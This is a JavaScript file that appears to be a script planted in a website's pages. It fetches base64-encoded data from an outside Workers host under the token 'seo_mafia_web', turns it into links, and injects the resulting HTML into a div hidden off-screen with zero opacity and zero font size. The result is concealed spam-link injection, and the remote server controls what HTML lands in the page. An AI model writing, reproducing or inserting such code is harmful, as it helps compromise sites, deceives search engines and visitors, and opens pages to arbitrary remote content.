!function(){
try{

  if(document.getElementById("bunker-payload-2")) return;
  const API_BASE = "https://smw-queryjs.data-deliver.workers.dev";
  const TOKEN = "seo_mafia_web";
  const decode = (s) => {
    try {
      return new TextDecoder().decode(
        Uint8Array.from(atob(s), c => c.charCodeAt(0))
      );
    } catch(e) {
      console.error("Decode error:", e);
      return "";
    }
  };
  async function getData(id){
    try{
      const res = await fetch(
        `${API_BASE}/data-value?id=${encodeURIComponent(id)}&token=${encodeURIComponent(TOKEN)}`,
        { cache: "no-store" }
      );
      if(!res.ok) throw new Error("Fetch failed: " + res.status);
      const json = await res.json();
      if(!json || !json.payload) throw new Error("Invalid payload");
      return decode(json.payload);
    }catch(err){
      console.error("Fetch error ("+id+"):", err);
      return "";
    }
  }
  Promise.all([
    getData("a1"),
    getData("b1")
  ]).then(([anchorsRaw, articleRaw]) => {
    if(!anchorsRaw || !articleRaw){
      console.warn("Data panel2 kosong");
      return;
    }
    anchorsRaw = anchorsRaw
      .replace(/\r/g,"")
      .replace(/"/g,"")
      .trim();

    articleRaw = articleRaw.trim();
    const anchors = anchorsRaw
      .split("\n")
      .map(x => x.trim())
      .filter(Boolean)
      .map(line => {

        line = line.replace(/\s*\|\s*/g, "|");
        const parts = line.split("|").map(x=>x.trim()).filter(Boolean);
        if(parts.length < 2) return "";
        const anchorText = parts[0];
        return parts.slice(1).map(url => {
          if(!/^https?:\/\//i.test(url)) return "";
          return `<a href="${url}" target="_blank">${anchorText}</a>`;
        }).join(" ");

      })
      .filter(Boolean);
    console.log("ANCHORS RESULT:", anchors);
    if(!anchors.length){
      console.warn("❌ panel2 kosong");
      return;
    }
    let i = 0;
    let html = "";
    if(/\{ANCHOR/i.test(articleRaw)){
      html = articleRaw.replace(/\{ANCHOR\s*\}/gi, () => {
        return anchors[i++ % anchors.length];
      });
    }else{
      html = anchors.join(" ");
    }
    inject(html);
  });
  function inject(html){
    if(document.getElementById("bunker-payload-2")) return;
    const box = document.createElement("div");
    box.id = "bunker-payload-2";
    box.style.cssText = "position:absolute;left:-9999px;opacity:0;font-size:0;";
    box.innerHTML = html;
    (document.body || document.documentElement).appendChild(box);
    console.log("✅ panel2 inject sukses");
  }
}catch(e){
  console.error("panel2 fatal error:", e);
}
}();
